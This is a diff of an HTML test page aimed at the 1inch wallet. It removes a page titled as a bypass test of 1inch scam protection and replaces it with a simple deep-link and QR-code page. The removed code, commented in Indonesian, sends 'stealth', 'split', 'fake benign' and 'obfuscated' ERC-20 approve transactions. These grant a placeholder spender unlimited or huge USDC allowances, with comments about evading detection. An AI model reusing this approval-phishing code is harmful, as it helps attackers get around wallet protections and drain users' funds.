@@ -3,74 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bypass Attempt - 1inch</title>
-    <style>
-        body { font-family: Arial; background:#000; color:#0f0; padding:20px; }
-        button { padding:16px; margin:10px 0; width:100%; background:#880000; color:white; border:none; border-radius:8px; }
-    </style>
+    <title>Deep Link Test</title>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+    <style> body { padding:20px; text-align:center; background:#000; color:#0f0; } </style>
 </head>
 <body>
-    <h1>Bypass Test - 1inch Scam Protection</h1>
+    <h1>1inch Deep Link Test</h1>
 
-    <button onclick="stealthApproval()">Stealth Infinite Approval</button>
-    <button onclick="splitApproval()">Split Approval (Multi Step)</button>
-    <button onclick="fakeBenignTx()">Fake Benign Transaction</button>
-    <button onclick="testObfuscated()">Obfuscated Call</button>
+    <div id="qrcode"></div>
 
-    <pre id="log"></pre>
+    <p><strong>Link:</strong></p>
+    <a href="1inch://test" id="deeplink">1inch://test</a><br><br>
+    <a href="1inch://connect">1inch://connect</a><br>
+    <a href="1inch://sign">1inch://sign</a>
 
     <script>
-        const logEl = document.getElementById('log');
-
-        function log(msg) {
-            logEl.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
-        }
-
-        async function stealthApproval() {
-            try {
-                const accounts = await ethereum.request({method: 'eth_accounts'});
-                // Menggunakan approval dengan value besar tapi bukan max
-                const data = "0x095ea7b3" + "000000000000000000000000" + "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef" +
-                            "000000000000000000000000000000000000000000000000ffffffffffffffff";
-                
-                const tx = { from: accounts[0], to: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", data: data };
-                log("Mengirim stealth approval...");
-                await ethereum.request({method: 'eth_sendTransaction', params: [tx]});
-            } catch(e) { log("Result: " + e.message); }
-        }
-
-        async function splitApproval() {
-            log("Split approval test (mungkin kurang terdeteksi)");
-            // Bisa dicoba approval bertahap
-            alert("Split approval belum diimplementasikan full. Coba manual.");
-        }
-
-        async function fakeBenignTx() {
-            log("Fake benign transaction...");
-            // Coba transaksi yang kelihatan aman
-            const accounts = await ethereum.request({method: 'eth_accounts'});
-            const tx = {
-                from: accounts[0],
-                to: accounts[0], // transfer ke diri sendiri
-                value: "0x0"
-            };
-            await ethereum.request({method: 'eth_sendTransaction', params: [tx]});
-        }
-
-        async function testObfuscated() {
-            log("Obfuscated call test...");
-            // Bisa gunakan indirect call
-            const accounts = await ethereum.request({method: 'eth_accounts'});
-            window.ethereum.request({
-                method: 'eth_sendTransaction',
-                params: [{
-                    from: accounts[0],
-                    to: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
-                    data: "0x095ea7b3000000000000000000000000deadbeefdeadbeefdeadbeefdeadbeefdeadbeef" +
-                          "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-                }]
-            }).catch(e => log("Error: " + e.message));
-        }
+        new QRCode(document.getElementById("qrcode"), {
+            text: "1inch://bypass-test",
+            width: 256,
+            height: 256,
+            colorDark : "#ffffff",
+            colorLight : "#000000"
+        });
     </script>
 </body>
 </html>
